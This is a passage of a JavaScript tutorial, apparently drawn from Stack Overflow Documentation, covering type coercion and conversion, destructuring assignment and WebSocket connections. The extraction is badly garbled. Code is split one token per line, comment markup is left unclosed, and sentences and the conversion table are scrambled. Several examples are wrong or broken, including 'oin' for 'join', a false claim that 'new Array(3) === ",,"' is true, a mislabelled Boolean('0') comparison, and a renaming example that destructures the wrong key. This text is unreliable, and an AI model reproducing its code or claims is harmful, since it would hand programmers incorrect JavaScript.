<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch59">Chapter 59: Variable coercion/conversion</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-1">Section 59.1: Double Negation (!!x)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The double-negation !! is not a distinct JavaScript operator nor a
special syntax but rather just a sequence of two negations. It is used
to convert the value of any type to its appropriate <b>true</b> or
<b>false</b> Boolean value depending on whether it is <i>truthy</i> or
<i>falsy</i>.
!!
1
// <i>true</i>
!!
0
// <i>false</i>
!!
<b>undefined</b>
// <i>false</i>
!!
{
}
// <i>true</i>
!!
&lbrack;
&rbrack;
// <i>true</i>
The first negation converts any value to <b>false</b> if it is <i>truthy</i>
and to <b>true</b> if is <i>falsy</i>. The second negation then operates on a
normal Boolean value. Together they convert any <i>truthy</i> value to
<b>true</b> and any <i>falsy</i> value to <b>false</b>.
However, many professionals consider the practice of using such syntax
unacceptable and recommend simpler to read alternatives, even if
they&apos;re longer to write:
x !== 0 // <i>instead of !!x in case x is a number</i>
x != <b>null</b> // <i>instead of !!x in case x is an object, a string, or
an undefined</i>
!!
Usage of x is considered poor practice due to the following reasons:
1.  Stylistically it may look like a distinct special syntax whereas in
    fact it is not doing anything other than two consecutive negations
    with implicit type conversion.
2.  It is better to provide information about types of values stored in
variables and properties through the code.
x !==     0 says that x is probably a number, whereas                !!
For example, x does not convey any such advantage to readers of the
code.
Boolean
3.  Usage of (x) allows for similar functionality, and is a more
    explicit conversion of type.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-2">Section 59.2: Implicit conversion</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
JavaScript will try to automatically convert variables to more
appropriate types upon use. It&apos;s usually advised to do conversions
explicitly (see other examples), but it&apos;s still worth knowing what
conversions take place implicitly.
&quot;1&quot; + 5 === &quot;15&quot; // <i>5 got converted to string.</i>
1 + &quot;5&quot; === &quot;15&quot; // <i>1 got converted to string.</i> 1 - &quot;5&quot; === -4
// <i>&quot;5&quot; got converted to a number.</i> alert({}) // <i>alerts &quot;&lbrack;object
Object&rbrack;&quot;, {} got converted to string.</i>
!0 === <b>true</b> // <i>0 got converted to boolean</i> <b>if</b> (&quot;hello&quot;) {}
// <i>runs, &quot;hello&quot; got converted to boolean.</i> <b>new</b> Array(3) ===
&quot;,,&quot;; // <i>Return true. The array is converted to string -
Array.toString();</i> Some of the trickier parts:
!&quot;0&quot; === <b>false</b> // <i>&quot;0&quot; got converted to true, then reversed.</i>
!&quot;false&quot; === <b>false</b> // <i>&quot;false&quot; converted to true, then
reversed.</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-3">Section 59.3: Converting to boolean</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Boolean                                       (      &hellip;
) will convert any data type into either <b>true</b> or <b>false</b>.
Boolean
(
&quot;true&quot;
)
===
<b>true</b>
Boolean
(
&quot;false&quot;
)
===
<b>true</b>
Boolean
(
&minus;
1
)
===
<b>true</b>
Boolean
(
1
)
===
<b>true</b>
Boolean
(
0
)
===
<b>false</b>
Boolean
(
&quot;&quot;
)
===
<b>false</b>
Boolean
(
&quot;1&quot;
)
===
<b>true</b>
Boolean
(
&quot;0&quot;
)
===
<b>true</b>
Boolean
(
{
}
)
===
<b>true</b>
Boolean
(
&lbrack;
&rbrack;
)
===
<b>true</b>
Empty strings and the number 0 will be converted to false, and all
others will be converted to true.
A shorter, but less clear, form:
!!
&quot;true&quot;
===
<b>true</b>
!!
&quot;false&quot;
===
<b>true</b>
!!-
1
===
<b>true</b>
!!
1
===
<b>true</b>
!!
0
===
<b>false</b>
!!
&quot;&quot;
===
<b>false</b>
!!
&quot;1&quot;
===
<b>true</b>
!!
&quot;0&quot;
===
<b>true</b>
!!
{
}
===
<b>true</b>
!!
&lbrack;
&rbrack;
===
<b>true</b>
This shorter form takes advantage of implicit type conversion using
the logical NOT operator twice, as described in
http://stackoverflow.com/documentation/javascript/208/boolean-logic/3047/double-negation-x
Here is the complete list of boolean conversions from the [ECMAScript
specification](http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf)
Boolean              (   myArg          )   === <b>false</b>
Boolean              (   myArg          )   === myArg
Boolean              (   myArg          )   === <b>false</b>
Boolean              (   myArg          )   === <b>false</b>
Boolean               (   myArg           )   === <b>true</b>
if myArg of type <b>undefined</b> or <b>null</b> then if myArg of type
boolean then
if myArg of type number then if myArg is +0, ‑0, or <b>NaN</b>; otherwise
<b>true</b> if myArg of type string then if myArg is the empty String
(its length is zero); otherwise <b>true</b>
if myArg of type symbol or object then
Values that get converted to <b>false</b> as booleans are called <i>falsy</i>
(and all others are called <i>truthy</i>). See Comparison Operations.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-4">Section 59.4: Converting a string to a number</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Number
(
&apos;0&apos;
)
===
0
  Number                                     (       &apos;0&apos;
) will convert the string (&apos;0&apos;) into a number (0)

A shorter, but less clear, form:
&plus;
&apos;0&apos;
===
0
The unary + operator does nothing to numbers, but converts anything
else to a number.
12 ) === &minus; 12
Interestingly, +(-.
parseInt
(
&apos;0&apos;
,
10
)
===
0
parseInt  ( &apos;0&apos; , 10
) will convert the string (&apos;0&apos;) into a number (0), don&apos;t forget the
second argument, which is radix.
If not given, parseInt could convert string to wrong number.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-5">Section 59.5: Converting a number to a string</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
String
(
0
)
===
&apos;0&apos;
String
&lpar;0&rpar; will convert the number (0) into a string (&apos;0&apos;).
A shorter, but less clear, form:
&apos;&apos;
&plus;
0
===
&apos;0&apos;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-6">Section 59.6: Primitive to Primitive conversion table</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>Value Converted                                        
To String                                                
Converted To                                             
Number Converted                                         
To Boolean</b>                                             
undefinded                           NaN                 false
&quot;undefined&quot;                                            
  null &quot;null&quot;                        0                   false
  true &quot;true&quot;                        1                   
  false &quot;false&quot;                      0                   
  NaN &quot;NaN&quot;                                              <b>false</b>
  &quot;&quot; empty string                    0                   <b>false</b>
  &quot; &quot;                                0                   <b>true</b>
  &quot;2.4&quot; (numeric)                    2.4                 true
  &quot;test&quot; (non                        NaN                 true
  numeric                                                  
  &quot;0&quot;                                0                   <b>true</b>
  &quot;1&quot;                                1                   true
-0   &quot;0&quot;  <b>false</b>
0    &quot;0&quot;  false
1    &quot;1&quot;  true
Infinity  &quot;Infinity&quot;                           true
Infinity  &quot;-Infinity&quot;                          true
&lbrack;&rbrack;   &quot;&quot;   0  true
&lbrack;3&rbrack;  &quot;3&quot;  3  true
&lbrack;&apos;a&apos;&rbrack;         &quot;a&quot;              NaN                 true
&lbrack;&apos;a&apos;,&apos;b&apos;&rbrack;   &quot;a,b&quot;            NaN                 true
{ }               &quot;&lbrack;object         NaN                 true
Object&rbrack;&quot;                             
function(){}      &quot;function(){}&quot;   NaN                 true
Bold values highlight conversion that programmers may find surprising
To convert explicitly values you can use String() Number() Boolean()
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-7">Section 59.7: Convert an array to a string</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Array   .  join   (   separator
) can be used to output an array as a string, with a configurable
separator.
Default (separator = &quot;,&quot;):
&lbrack;
&quot;a&quot;
,
&quot;b&quot;
,
&quot;c&quot;
&rbrack;
.
join
(
)
===
&quot;a,b,c&quot;
With a string separator:
&lbrack;
1
,
2
,
3
,
4
&rbrack;
.
join
(
&quot; + &quot;
)
===
&quot;1 + 2 + 3 + 4&quot;
With a blank separator:
&lbrack;
&quot;B&quot;
,
&quot;o&quot;
,
&quot;b&quot;
&rbrack;
.
oin
(
&quot;&quot;
)
===
&quot;Bob&quot;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-8">Section 59.8: Array to String using array methods</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
This way may seem to be useless because you are using anonymous
function to accomplish something that you can do it with join(); But
if you need to make something to the strings while you are converting
the Array to String, this can be useful.
<b>var</b>
arr
=
&lbrack;
&apos;a&apos;
,
&apos;
á
&apos;
,
&apos;b&apos;
,
&apos;c&apos;
&rbrack;
<b>function</b>
upper_lower
(
a
,
b
,
i
)
{
// <i>&hellip;do something here</i>
b
=
i
&
1
?
b&period;
toUpperCase
(
)
:
b&period;
toLowerCase
(
)
;
<b>return</b>
a
&plus;
&apos;,&apos;
&plus;
b
}
arr
=
arr.
reduce
(
upper_lower
)
;
// <i>&quot;a,</i>
Á
<i>,b,C&quot;</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-9">Section 59.9: Converting a number to a boolean</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Boolean
(
0
)
===
<b>false</b>
Boolean(
0&rpar; will convert the number 0 into a boolean <b>false</b>.

A shorter, but less clear, form:
!!
0
===
<b>false</b>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-10">Section 59.10: Converting a string to a boolean</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
To convert a string to boolean use
Boolean
(
myString
)
or the shorter but less clear form
!!
myString
All strings except the empty string (of length zero) are evaluated to
<b>true</b> as booleans.
Boolean
(
&apos;&apos;
)
===
<b>false</b>
// <i>is true</i>
Boolean
(
&quot;&quot;
)
===
<b>false</b>
// <i>is true</i>
Boolean
(
&apos;0&apos;
)
===
<b>false</b>
// <i>is false</i>
Boolean
(
&apos;any_nonempty_string&apos;
)
===
<b>true</b>
// <i>is true</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-11">Section 59.11: Integer to Float</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
In JavaScript, all numbers are internally represented as floats. This
means that simply using your integer as a float is all that must be
done to convert it.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-12">Section 59.12: Float to Integer</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
To convert a float to an integer, JavaScript provides multiple
methods.

The floor function returns the first integer less than or equal to the
float.
Math
.
floor
(
5.7
)
;
// <i>5</i>
The ceil function returns the first integer greater than or equal to
the float.
Math
.
ceil
(
5.3
)
;
// <i>6</i>
The round function rounds the float.
Math
.
round
(
3.2
)
;
// <i>3</i>
Math
.
round
(
3.6
)
;
// <i>4</i>
Version
≥
6
Truncation (trunc) removes the decimals from the float.
Math
.
trunc
(
3.7
)
;
// <i>3</i>
Notice the difference between truncation (trunc) and floor:
Math
.
floor
(
&minus;
3.1
)
;
// <i>-4</i>
Math
.
trunc
(
&minus;
3.1
)
;
// <i>-3</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch59-13">Section 59.13: Convert string to float</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
parseFloat accepts a string as an argument which it converts to a
float/
parseFloat
(
&quot;10.01&quot;
)
// <i>= 10.01</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch60">Chapter 60: Destructuring assignment</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Destructuring is a <b>pattern matching</b> technique that is added to
JavaScript recently in ECMAScript 6.
It allows you to bind a group of variables to a corresponding set of
values when their pattern matches to the right hand-side and the left
hand-side of the expression.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch60-1">Section 60.1: Destructuring Objects</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Destructuring is a convenient way to extract properties from objects
into variables.
Basic syntax:
<b>let</b>
person
=
{
name
:
&apos;Bob&apos;
,
age
:
25
}
;
<b>let</b>
{
name
,
age
}
=
person
;
// <i>Is equivalent to</i>
<b>let</b>
name
=
person.
name
;
// <i>&apos;Bob&apos;</i>
<b>let</b>
age
=
person.
age
;
// <i>25</i>
Destructuring and renaming:
<b>let</b>
person
=
{
name
:
&apos;Bob&apos;
,
age
:
25
}
;
<b>let</b>
{
name
:
firstName
}
=
person
;
// <i>Is equivalent to</i>
<b>let</b>
firstName
=
person.
name
;
// <i>&apos;Bob&apos;</i>
Destructuring with default values:
<b>let</b>
person
=
{
name
:
&apos;Bob&apos;
,
age
:
25
}
;
<b>let</b>
{
phone
=
&apos;123-456-789&apos;
}
=
person
;
// <i>Is equivalent to</i>
<b>let</b>
phone
=
person.
hasOwnProperty
(
&apos;phone&apos;
)
?
person.
phone
:
&apos;123-456-789&apos;
;
// <i>&apos;123-456-789&apos;</i>
Destructuring and renaming with default values
<b>let</b>
person
=
{
name
:
&apos;Bob&apos;
,
age
:
25
}
;
<b>let</b>
{
phone
:
p
=
&apos;123-456-789&apos;
}
=
person
;
// <i>Is equivalent to</i>

<b>let</b> p = person.hasOwnProperty(&apos;phone&apos;) ? person.phone :
&apos;123-456-789&apos;; // <i>&apos;123-456-789&apos;</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch60-2">Section 60.2: Destructuring function arguments</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Pull properties from an object passed into a function. This pattern
simulates named parameters instead of relying on argument position.
<b>let</b>
user
=
{
name
:
&apos;Jill&apos;
,
age
:
33
,
profession
:
&apos;Pilot&apos;
}
<b>function</b>
greeting
(
{
name
,
profession
}
)
{
console.
log
(
&grave;Hello
,
&dollar;
{
name
}
the &dollar;
{
profession
}
&grave;
)
}
greeting
(
user
)
This also works for arrays:
<b>let</b>
parts
=
&lbrack;
&quot;Hello&quot;
,
&quot;World!&quot;
&rbrack;
;
<b>function</b>
greeting
(
&lbrack;
first
,
second
&rbrack;
)
{
console.
log
(
&grave;&dollar;
{
first
}
&dollar;
{
second
}
&grave;
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch60-3">Section 60.3: Nested Destructuring</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
We are not limited to destructuring an object/array, we can
destructure a nested object/array.
<b><i>Nested Object Destructuring</i></b>
<b>var</b>
obj
=
{
a
:
{
c
:
1
,
d
:
3
}
,
b
:
2
}
;
<b>var</b>
{
a
:
{
c
:
x
,
d
:
y
}
,
b
:
z
}
=
obj
;
console.
log
(
x
,
y
,
z
)
;
// <i>1,3,2</i>
<b><i>Nested Array Destructuring</i></b>
<b>var</b>
arr
=
&lbrack;
1
,
2
,
&lbrack;
3
,
4
&rbrack;
,
5
&rbrack;
;
<b>var</b>
&lbrack;
a
,
,
&lbrack;
b
,
c
&rbrack;
,
d
&rbrack;
=
arr
;
console.
log
(
a
,
b
,
c
,
d
)
;
// <i>1 3 4 5</i>
Destructuring is not just limited to a single pattern, we can have
arrays in it, with n-levels of nesting. Similarly we can destructure
arrays with objects and vice-versa.
<b><i>Arrays Within Object</i></b>
<b>var</b>
obj
=
{
a
:
1
,
b
:
&lbrack;
2
,
3
&rbrack;
}
;
<b>var</b>
{
a
:
x1
,
b
:
&lbrack;
x2
,
x3
&rbrack;
}
=
obj
;
console.
log
(
x1
,
x2
,
x3
)
;
// <i>1 2 3</i>
<b><i>Objects Within Arrays</i></b>
<b>var</b>
arr
=
&lbrack;
1
,
2
,
{
a
:
3
}
,
4
&rbrack;
;
<b>var</b>
&lbrack;
x1
,
x2
,
{
a
:
x3
}
,
x4
&rbrack;
=
arr
;
console.
log
(
x1
,
x2
,
x3
,
x4
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch60-4">Section 60.4: Destructuring Arrays</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>const</b>
myArr
=
&lbrack;
&apos;one&apos;
,
&apos;two&apos;
,
&apos;three&apos;
&rbrack;
<b>const</b>
&lbrack;
a
,
b
,
c
&rbrack;
=

myArr
// <i>a = &apos;one&apos;, b = &apos;two, c = &apos;three&apos;</i>

We can set default value in destructuring array, see the example of
Default Value While Destructuring.

With destructuring array, we can swap the values of 2 variables
easily:
<b>var</b>
a
=
1
;
<b>var</b>
b
=
3
;
&lbrack;
a
,
b
&rbrack;
=
&lbrack;
b
,
a
&rbrack;
;
// <i>a = 3, b = 1</i>
We can specify empty slots to skip unneeded values:
&lbrack;
a
,
,
b
&rbrack;
=
&lbrack;
1
,
2
,
3
&rbrack;
// <i>a = 1, b = 3</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch60-5">Section 60.5: Destructuring inside variables</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Aside from destructuring objects into function arguments, you can use
them inside variable declarations as follows:
<b>const</b>
person
=
{
name
:
&apos;John Doe&apos;
,
age
:
45
,
location
:
&apos;Paris, France&apos;
,
}
;
<b>let</b> { name, age, location } = person;
console.log(&apos;I am &apos; + name + &apos;, aged &apos; + age + &apos; and living in
&apos; + location + &apos;.&apos;);
// <i>-&amp;quot;I am John Doe aged 45 and living in Paris, France.&quot;</i>
As you can see, three new variables were created: name, age and
location and their values were grabbed from the object person if they
matched key names.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch60-6">Section 60.6: Default Value While Destructuring</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
We often encounter a situation where a property we&apos;re trying to
extract doesn&apos;t exist in the object/array, resulting in a TypeError
(while destructuring nested objects) or being set to <b>undefined</b>.
While destructuring we can set a default value, which it will fallback
to, in case of it not being found in the object.
<b>var</b>
obj
=
{
a
:
1
}
;
<b>var</b>
{
a
:
x
,
b
:
x1
=
10
}
=
obj
;
console.
log
(
x
,
x1
)
;
// <i>1, 10*
<b>var</b>
arr
=
&lbrack;
&rbrack;
;
<b>var</b>
&lbrack;
a
=
5
,
b
=
10
,
c
&rbrack;
=
arr
;
console.
log
(
a
,
b
,
c
)
;
// <i>5, 10, undefined*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch60-7">Section 60.7: Renaming Variables While Destructuring</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Destructuring allows us to refer to one key in an object, but declare
it as a variable with a different name. The syntax looks like the
key-value syntax for a normal JavaScript object.
<b>let</b>
user
=
{
name
:
&apos;John Smith&apos;
,
id
:
10
,
email
:
&apos;johns@workcorp.com&apos;
,
}
;
<b>let</b>
{
user
:
userName
,
id
:
userId
}
=
user
;
console.
log
(
userName
)
// <i>John Smith*
console.
log
(
userId
)
// <i>10*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch61">Chapter 61: WebSockets</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>Parameter Details</b>

url The server url supporting this web socket connection. data The
content to send to the host. message The message received from the
host.
>
WebSocket is protocol, which enables two-way communication between a
client and server:
>
The goal WebSocket is to provide a mechanism for browser-based
applications that need two-way communication with servers that does
not rely on opening multiple HTTP connections. ([RFC
6455](https://tools.ietf.org/html/rfc6455))
>
WebSocket works over HTTP protocol.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch61-1">Section 61.1: Working with string messages</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>var</b>
wsHost
=
&quot;ws://my-sites-url.com/path/to/echo-web-socket-handler&quot;
;
<b>var</b>
ws
=
*new</b>
WebSocket
(
wsHost
)
;
<b>var</b>
value
=
&quot;an example message&quot;
;
// <i>onmessage : Event Listener - Triggered when we receive message form
server*
ws.
onmessage
=
<b>function</b>
(
message
)
{
<b>if</b>
(
message
===
value
)
{
console.
log
(
&quot;The echo host sent the correct message.&quot;
)
;
}
<b>else</b>
{
console.
log
(
&quot;Expected: &quot;
&plus;
value
)
;
console.
log
(
&quot;Received: &quot;
&plus;
message
)
;
}
}
;
// <i>onopen : Event Listener - event is triggered when websockets
readyState changes to open which means*
*now we are ready to send and receives messages from server*
ws.
onopen
=
<b>function</b>
(
)
{
// <i>send is used to send the message to server*
ws.
send
(
value
)
;
}
;
!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch61-2">Section 61.2: Establish a web socket connection</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>var</b>
wsHost
=
&quot;ws://my-sites-url.com/path/to/web-socket-handler&quot;
;
<b>var</b>
ws
=
<b>new</b>
WebSocket
(
wsHost
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch61-3">Section 61.3: Working with binary messages</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>var</b>
wsHost
=
&quot;http://my-sites-url.com/path/to/echo-web-socket-handler&quot;
;
<b>var</b>
ws
=
<b>new</b>
WebSocket
(
wsHost
)
;
<b>var</b>
buffer
=
<b>new</b>
ArrayBuffer
(
5
)
;
// <i>5 byte buffer*
<b>var</b>
bufferView
=
<b>new</b>
DataView
(
buffer
)
;
bufferView.
setFloat32
(
0
,
Math
.
PI
)
;
bufferView.
setUint8
(
4
,
127
)
;
ws.
binaryType
=
&apos;arraybuffer&apos;
;
ws.
onmessage
=
<b>function</b>
(
message
)
{
<b>var</b>
view
=
<b>new</b>
DataView
(
message.
data
)
;
console.
log
(
&apos;Uint8:&apos;
,
view.
getUint8
(
4
)
,
&apos;Float32:&apos;
,
view.
getFloat32
(
0
)
)
}
;
ws.
onopen
=
<b>function</b>
(
)
{
ws.
send
(
buffer
)
;
}
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch61-4">Section 61.4: Making a secure web socket connection</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>var</b>
sck
=
&quot;wss://site.com/wss-handler&quot;
;
<b>var</b>
wss
=
<b>new</b>
WebSocket
(
sck
)
;
This uses the wss instead of ws to make a secure web socket connection
which make use of HTTPS instead of HTTP
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch62">Chapter 62: Arrow Functions</h2>
